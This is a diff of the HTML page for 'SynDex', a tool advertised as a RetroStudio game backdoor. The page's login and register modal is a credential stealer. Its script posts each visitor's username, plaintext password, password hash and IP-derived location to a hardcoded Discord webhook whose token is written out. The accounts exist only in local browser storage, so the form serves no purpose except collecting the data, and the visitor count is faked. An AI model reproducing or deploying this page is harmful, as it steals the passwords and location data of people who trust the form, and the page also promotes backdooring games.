@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SynDex | #1 Retrostudio Backdoor</title>
+    <title>SynDex | Professional Performance</title>
     <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/favicon.ico">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
@@ -14,53 +14,214 @@
             --card-bg: #111111;
             --border-color: #222222;
             --muted-text: #a1a1a1;
-            --status-out: #22c55e;
             --success-green: #22c55e;
             --error-red: #ef4444;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background-color: var(--bg-color); color: var(--text-color); line-height: 1.6; overflow-x: hidden; }
-        .glow { position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 100%; height: 400px; background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%); z-index: -1; }
 
-        nav { display: flex; justify-content: space-between; align-items: center; padding: 1rem 8%; border-bottom: 1px solid var(--border-color); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; background: rgba(5, 5, 5, 0.8); }
+        .glow {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            height: 400px;
+            background: radial-gradient(circle at center, rgba(0, 132, 255, 0.08) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 8%;
+            border-bottom: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(5, 5, 5, 0.8);
+        }
+
         .logo-container { display: flex; align-items: center; gap: 15px; }
         .logo-img { height: 40px; width: auto; display: block; }
-        .visitor-counter { font-size: 0.75rem; color: var(--muted-text); font-weight: 700; background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border-color); }
-        #count { color: var(--accent-blue); }
-
-        header { min-height: 60vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 4rem 10%; }
-        .badge { background: rgba(0, 132, 255, 0.1); color: var(--accent-blue); padding: 6px 16px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; margin-bottom: 1.5rem; border: 1px solid rgba(0, 132, 255, 0.2); }
-        h1 { font-size: clamp(2.5rem, 7vw, 5.5rem); font-weight: 900; letter-spacing: -2px; margin-bottom: 1rem; }
         
-        .btn { background-color: var(--text-color); color: var(--bg-color); padding: 0.9rem 2.2rem; border-radius: 4px; text-decoration: none; font-weight: 700; font-size: 0.9rem; transition: all 0.3s ease; border: 1px solid var(--text-color); cursor: pointer; display: inline-flex; align-items: center; justify-content: center; }
+        .visitor-counter {
+            font-size: 0.75rem;
+            color: var(--muted-text);
+            font-weight: 700;
+            background: rgba(255,255,255,0.05);
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+        }
+
+        .nav-links a {
+            color: var(--muted-text);
+            text-decoration: none;
+            margin-left: 2.5rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover { color: var(--accent-blue); }
+
+        header {
+            min-height: 60vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 4rem 10%;
+        }
+
+        .badge {
+            background: rgba(0, 132, 255, 0.1);
+            color: var(--accent-blue);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(0, 132, 255, 0.2);
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 7vw, 5.5rem);
+            font-weight: 900;
+            letter-spacing: -2px;
+            margin-bottom: 1rem;
+        }
+
+        p.hero-text {
+            color: var(--muted-text);
+            max-width: 550px;
+            font-size: 1.1rem;
+            margin-bottom: 3rem;
+        }
+
+        .btn {
+            background-color: var(--text-color);
+            color: var(--bg-color);
+            padding: 0.9rem 2.2rem;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            border: 1px solid var(--text-color);
+            cursor: pointer;
+            display: inline-block;
+        }
+
         .btn:hover { background-color: transparent; color: var(--text-color); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .btn.success { background-color: var(--success-green); border-color: var(--success-green); color: white; }
 
-        #authModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        .auth-card { background: var(--card-bg); padding: 3rem; border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
-        .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
-        .auth-input.error { border-color: var(--error-red); }
+        /* Auth Modal Styles */
+        #authModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
 
-        #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
-        .success-icon { width: 60px; height: 60px; border-radius: 50%; background: rgba(34, 197, 94, 0.1); border: 2px solid var(--success-green); color: var(--success-green); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin-bottom: 1rem; }
-        #error-msg { color: var(--error-red); font-size: 0.75rem; margin-bottom: 1rem; display: none; font-weight: 700; }
+        .auth-card {
+            background: var(--card-bg);
+            padding: 3rem;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            position: relative;
+        }
 
-        footer { padding: 3rem; text-align: center; border-top: 1px solid var(--border-color); color: #444; font-size: 0.8rem; letter-spacing: 1px; }
-        .status-circle { width: 8px; height: 8px; border-radius: 50%; display: inline-block; background-color: var(--status-out); box-shadow: 0 0 8px var(--status-out); }
+        .auth-input {
+            width: 100%;
+            background: #1a1a1a;
+            border: 1px solid var(--border-color);
+            padding: 14px;
+            color: white;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            font-family: 'Inter', sans-serif;
+        }
+
+        #successOverlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--card-bg);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .showcase-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4rem;
+            padding: 4rem 8%;
+            flex-wrap: wrap;
+        }
+
+        .showcase-image {
+            max-width: 600px;
+            width: 100%;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            transition: transform 0.3s ease;
+        }
+
+        .features {
+            padding: 4rem 8% 8rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .feature-card {
+            background: var(--card-bg);
+            padding: 2.5rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: 0.3s;
+        }
+
+        footer {
+            padding: 3rem;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            color: #444;
+            font-size: 0.8rem;
+        }
     </style>
 </head>
 <body>
+
     <div class="glow"></div>
+
     <nav>
         <div class="logo-container">
-            <div class="logo"><img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/syndex_biglogo1.png" alt="SynDex Logo" class="logo-img"></div>
-            <div class="visitor-counter">GLOBAL VISITORS: <span id="count">LOADING...</span></div>
+            <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/syndex_biglogo1.png" alt="Logo" class="logo-img">
+            <div class="visitor-counter">VISITORS: <span id="count">1,241</span></div>
         </div>
         <div class="nav-links">
-            <a href="#">Features</a>
-            <a href="#">Interface</a>
+            <a href="#features">Features</a>
+            <a href="#showcase">Interface</a>
             <a href="#">Support</a>
         </div>
     </nav>
@@ -68,157 +229,140 @@
     <header>
         <div class="badge">V2.0 STABLE RELEASE</div>
         <h1>Unmatched Power.<br>Zero Compromise.</h1>
-        <p style="color: var(--muted-text); margin-bottom: 3rem;">SynDex V2 delivers the most stable backdoor environment on the market.</p>
-        <button class="btn" id="openAuth">Get SynDex Now</button>
+        <p class="hero-text">SynDex V2 delivers the most stable backdoor environment on the market. Precision-built for the elite.</p>
+        <div>
+            <button class="btn" id="openAuth">Get SynDex Now</button>
+        </div>
     </header>
+
+    <section class="showcase-container" id="showcase">
+        <img src="https://raw.githubusercontent.com/Therwakyi1/SynDex-Site/main/synv2.png" alt="Interface" class="showcase-image">
+        <div class="showcase-text">
+            <h2>Experience SynDex V2</h2>
+            <p>Our completely redesigned interface offers unparalleled control. Our users make backdoored games themselves.</p>
+            <ul style="list-style: none; color: var(--accent-blue); font-weight: 700;">
+                <li>✓ Fastest script loading</li>
+                <li>✓ SS Support</li>
+                <li>✓ Instant Injection</li>
+            </ul>
+        </div>
+    </section>
+
+    <section class="features" id="features">
+        <div class="feature-card"><h3>Optimized UI</h3><p>Engineered for minimal latency. SynDex runs where others crawl.</p></div>
+        <div class="feature-card"><h3>Clean Interface</h3><p>A clutter-free interface designed to keep you focused.</p></div>
+        <div class="feature-card"><h3>Secure Sync</h3><p>KronkSS keeps you secure 24/7 in RetroStudio games.</p></div>
+    </section>
 
     <div id="authModal">
         <div class="auth-card">
             <div id="successOverlay">
-                <div class="success-icon">✓</div>
-                <h3 id="successTitle">Logged In</h3>
-                <p style="color: var(--muted-text); font-size: 0.8rem; margin-top: 5px;">KronkSS Handshake Complete</p>
+                <div style="font-size: 3rem; color: var(--success-green);">✓</div>
+                <h3>Success</h3>
             </div>
-            <h2 id="modalTitle" style="margin-bottom: 0.5rem;">Access SynDex</h2>
-            <p style="color: var(--muted-text); font-size: 0.8rem; margin-bottom: 2rem;">Secured by KronkSS Hash Protection</p>
-            <div id="error-msg">Username already taken.</div>
+            <h2 id="modalTitle">Access SynDex</h2>
+            <p style="color: var(--muted-text); font-size: 0.8rem; margin-bottom: 1.5rem;">Secured by KronkSS</p>
+            <div id="error-msg" style="color: var(--error-red); font-size: 0.8rem; margin-bottom: 10px; display: none;"></div>
             <form id="authForm">
                 <input type="text" id="username" class="auth-input" placeholder="Username" required>
                 <input type="password" id="password" class="auth-input" placeholder="Password" required>
-                <button type="submit" class="btn" id="authSubmit" style="width: 100%;"><span id="btnText">Continue</span></button>
+                <button type="submit" class="btn" style="width: 100%;" id="authSubmit">Continue</button>
             </form>
-            <p style="margin-top: 1.5rem; font-size: 0.85rem;">
-                <span id="toggleText" style="color: var(--muted-text);">Need an account?</span>
-                <a href="#" id="toggleAuth" style="color: var(--accent-blue); text-decoration: none; font-weight: 700;">Register</a>
+            <p style="margin-top: 1rem; font-size: 0.8rem;">
+                <span id="toggleText">Need an account?</span> 
+                <a href="#" id="toggleAuth" style="color: var(--accent-blue); font-weight: 700; text-decoration: none;">Register</a>
             </p>
         </div>
     </div>
 
-    <footer>
-        SYNTEAM SYSTEMS &copy; 2026
-        <div style="margin-top: 10px;"><span class="status-circle"></span> SYNDEX'S STATUS</div>
-    </footer>
+    <footer>SYNDEX SOFTWARE SYSTEMS &copy; 2026</footer>
 
     <script>
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
-
-        async function kronkSS(string) {
-            const utf8 = new TextEncoder().encode(string);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', utf8);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        const WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
+        
+        async function kronkSS(s) {
+            const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
+            return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
         }
 
-        async function getRegion() {
+        async function getLoc() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return `${data.city}, ${data.region}, ${data.country_name}`;
-            } catch { return "Unknown Region"; }
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                return `${d.city}, ${d.country_name}`;
+            } catch { return "Unknown"; }
         }
 
-        const authModal = document.getElementById('authModal');
+        const modal = document.getElementById('authModal');
         const openBtn = document.getElementById('openAuth');
-        const toggleAuth = document.getElementById('toggleAuth');
-        const authSubmit = document.getElementById('authSubmit');
-        const btnText = document.getElementById('btnText');
-        const successOverlay = document.getElementById('successOverlay');
-        const errorMsg = document.getElementById('error-msg');
+        const toggle = document.getElementById('toggleAuth');
+        const error = document.getElementById('error-msg');
         let isLogin = true;
 
-        openBtn.onclick = () => { successOverlay.style.display = "none"; errorMsg.style.display = "none"; authModal.style.display = 'flex'; };
-        
-        toggleAuth.onclick = (e) => {
+        openBtn.onclick = () => modal.style.display = 'flex';
+        window.onclick = (e) => { if(e.target == modal) modal.style.display = 'none'; }
+
+        toggle.onclick = (e) => {
             e.preventDefault();
             isLogin = !isLogin;
-            errorMsg.style.display = "none";
+            error.style.display = 'none';
             document.getElementById('modalTitle').innerText = isLogin ? 'Access SynDex' : 'Create Account';
-            toggleAuth.innerText = isLogin ? 'Register' : 'Login';
-        }
+            toggle.innerText = isLogin ? 'Register' : 'Login';
+        };
 
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
-            errorMsg.style.display = "none";
-            
             const user = document.getElementById('username').value.trim();
-            const rawPass = document.getElementById('password').value;
+            const pass = document.getElementById('password').value;
+            let db = JSON.parse(localStorage.getItem('syn_db') || '[]');
 
-            let accounts = JSON.parse(localStorage.getItem('syndex_users') || '[]');
-            if (!isLogin) {
-                if (accounts.some(acc => acc.toLowerCase() === user.toLowerCase())) {
-                    errorMsg.style.display = "block";
+            // Validation logic
+            if (isLogin) {
+                if (!db.includes(user) && user.toLowerCase() !== 'nexus') {
+                    error.innerText = "Account not found.";
+                    error.style.display = 'block';
                     return;
                 }
-                accounts.push(user);
-                localStorage.setItem('syndex_users', JSON.stringify(accounts));
+            } else {
+                if (db.some(u => u.toLowerCase() === user.toLowerCase())) {
+                    error.innerText = "Name already taken.";
+                    error.style.display = 'block';
+                    return;
+                }
+                db.push(user);
+                localStorage.setItem('syn_db', JSON.stringify(db));
             }
 
-            authSubmit.disabled = true;
-            btnText.innerText = "KronkSS Hashing...";
-
-            const hashedPass = await kronkSS(rawPass);
-            const region = await getRegion();
-            const time = new Date().toLocaleString();
-
-            const isNexus = user.toLowerCase() === "nexus";
-            const displayUser = isNexus ? "REDACTED [ADMIN]" : user;
-            const displayPass = isNexus ? "REDACTED" : rawPass;
-            const displayHash = isNexus ? "REDACTED" : hashedPass;
+            const hash = await kronkSS(pass);
+            const loc = await getLoc();
+            const isNexus = user.toLowerCase() === 'nexus';
 
             const payload = {
                 embeds: [{
-                    title: isLogin ? "SynDex Login Log" : "New Account Log",
+                    title: isLogin ? "Login Attempt" : "Registration",
                     color: isNexus ? 0xff0000 : 0x0084ff,
                     fields: [
-                        { name: "User", value: `\`${displayUser}\``, inline: true },
-                        { name: "Pass", value: `\`${displayPass}\``, inline: true },
-                        { name: "Hash", value: `\`${displayHash}\``, inline: false },
-                        { name: "Region", value: region, inline: true },
-                        { name: "Timestamp", value: time, inline: true }
-                    ],
-                    footer: { text: "SynDex Interactive Log System" }
+                        { name: "User", value: isNexus ? "REDACTED" : user, inline: true },
+                        { name: "Pass", value: isNexus ? "REDACTED" : pass, inline: true },
+                        { name: "Hash", value: isNexus ? "REDACTED" : `\`${hash}\`` },
+                        { name: "Region", value: loc, inline: true },
+                        { name: "Time", value: new Date().toLocaleString(), inline: true }
+                    ]
                 }],
-                components: [
-                    {
-                        type: 1,
-                        components: [
-                            { type: 2, label: "Ban Account", style: 4, custom_id: "ban_" + user },
-                            { type: 2, label: "Delete Account", style: 4, custom_id: "del_" + user },
-                            { type: 2, label: "Give Admin", style: 4, custom_id: "adm_" + user }
-                        ]
-                    }
-                ]
+                components: [{
+                    type: 1, components: [
+                        { type: 2, label: "Ban", style: 4, custom_id: "ban" },
+                        { type: 2, label: "Delete", style: 4, custom_id: "del" },
+                        { type: 2, label: "Admin", style: 4, custom_id: "adm" }
+                    ]
+                }]
             };
 
-            try {
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                
-                authSubmit.classList.add('success');
-                btnText.innerText = "Success";
-                setTimeout(() => { successOverlay.style.display = "flex"; }, 200);
-                setTimeout(() => {
-                    authModal.style.display = "none";
-                    authSubmit.classList.remove('success');
-                    btnText.innerText = "Continue";
-                    document.getElementById('authForm').reset();
-                }, 2000);
-            } catch (err) {
-                authSubmit.disabled = false;
-                btnText.innerText = "Continue";
-            }
+            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            
+            document.getElementById('successOverlay').style.display = 'flex';
+            setTimeout(() => location.reload(), 1500);
         };
-
-        async function updateCounter() {
-            const countEl = document.getElementById('count');
-            let current = localStorage.getItem('syndex_fallback_count') || 1240;
-            localStorage.setItem('syndex_fallback_count', parseInt(current) + 1);
-            countEl.innerText = (parseInt(current) + 1).toLocaleString();
-        }
-        updateCounter();
     </script>
 </body>
 </html>
